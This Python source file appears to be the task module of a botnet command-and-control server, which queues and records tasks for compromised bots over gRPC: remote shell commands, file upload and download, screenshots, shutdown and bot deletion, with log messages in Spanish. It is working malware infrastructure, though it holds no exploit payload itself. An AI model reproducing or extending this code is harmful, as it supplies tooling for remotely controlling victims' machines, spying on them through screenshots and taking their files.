import uuid
from server.modules import log, database
from server.modules.utils import time
from protos.botnet_pb2 import *
from protos.botnet_pb2_grpc import *

def get_status_task(task):
    if task[3] == "1":
        status = "OK"
    elif task[3] == "2":
        status = "ERROR"
    elif task[3] == "3":
        status = "WAITING"
    else:
        status = "MISSING"
    return status

def get_type_task(task):
    if task[2] == "1":
        tasktype = "CONNECTION"
    elif task[2] == "2":
        tasktype = "ADMIN"
    elif task[2] == "3":
        tasktype = "CMD"
    elif task[2] == "4":
        tasktype = "UPLOAD"
    elif task[2] == "5":
        tasktype = "DOWNLOAD"
    elif task[2] == "6":
        tasktype = "SCREENSHOT"
    elif task[2] == "7":
        tasktype = "SHUTDOWN"
    elif task[2] == "8":
        tasktype = "DELETE"
    else:
        tasktype = "UNKNOWN"
    return tasktype

def generate_tasks(tasks):
    array = []
    if len(tasks) > 0:
        for task in tasks:
            status = get_status_task(task)
            type = get_type_task(task)
            if status != "WAITING":
                if type == "CMD":
                    array.append(Task(task_id=task[0], bot_id=task[1], type=type, status=status, date_start=task[4], date_finish=task[5], command=task[6], response=task[7]))
                elif type == "UPLOAD" or type == "DOWNLOAD":
                    array.append(Task(task_id=task[0], bot_id=task[1], type=type, status=status, date_start=task[4], date_finish=task[5], file=task[6], response=task[7]))
                else:
                    array.append(Task(task_id=task[0], bot_id=task[1], type=type, status=status, date_start=task[4], date_finish=task[5]))
            else:
                if type == "CMD":
                    array.append(Task(task_id=task[0], bot_id=task[1], type=type, status=status, date_start=task[4], date_finish=task[5], command=task[6]))
                elif type == "UPLOAD" or type == "DOWNLOAD":
                    array.append(Task(task_id=task[0], bot_id=task[1], type=type, status=status, date_start=task[4], date_finish=task[5], file=task[6]))
                else:
                    array.append(Task(task_id=task[0], bot_id=task[1], type=type, status=status, date_start=task[4], date_finish=task[5]))
    return array

def get_task_info():
    task_id = str(uuid.uuid1())
    fecha_inicio = time.get_time()
    return task_id, fecha_inicio

def add_task(db, task):
    id = task.bot_id
    task_id, fecha_inicio = get_task_info()
    if task.type == 3:
        array = [task_id, id, task.type, task.status, fecha_inicio, "", task.command, ""]
    elif task.type == 4 or task.type == 5:
        array = [task_id, id, task.type, task.status, fecha_inicio, "", task.file, ""]
    else:
        array = [task_id, id, task.type, task.status, fecha_inicio, "", "", ""]
    database.add_task(db, array)
    log.add(f"./server/logs/bots/{id}", id, "TASK", f"Se ha añadido la tarea {task_id} al bot {id}", "OK")

def get_pending_tasks(db):
    tasks = database.get_pending_tasks(db)
    return generate_tasks(tasks)

def get_pending_tasks_bot(db, response):
    tasks = database.get_pending_tasks_bot(db, response.bot_id)
    return generate_tasks(tasks)

def save_task(db, task):
    id = task.bot_id
    if task.type == 3:
        array = [task.task_id, id, task.type, task.status, task.date_start, task.date_finish, task.command, task.response]
    elif task.type == 4 or task.type == 5:
        array = [task.task_id, id, task.type, task.status, task.date_start, task.date_finish, task.file, task.response] 
    else:
        if task.type == 8:
            database.delete_bot(db, id)
        array = [task.task_id, id, task.type, task.status, task.date_start, task.date_finish, "", ""]
    database.add_completed_task(db, array)

def get_completed_tasks(db):
    complete = database.get_completed_tasks(db)
    return generate_tasks(complete)

def get_completed_tasks_bot(db, response):
    complete = database.get_completed_task_id(db, response.bot_id)
    return generate_tasks(complete)

def get_task_id(db, response):
    task = database.get_task(db, response.task_id)
    array = generate_tasks(task)
    if array == []:
        array.append(Task(task_id=response.task_id, bot_id="", type="UNKNOWN", status="ERROR", date_start="", date_finish=""))
    return array[0]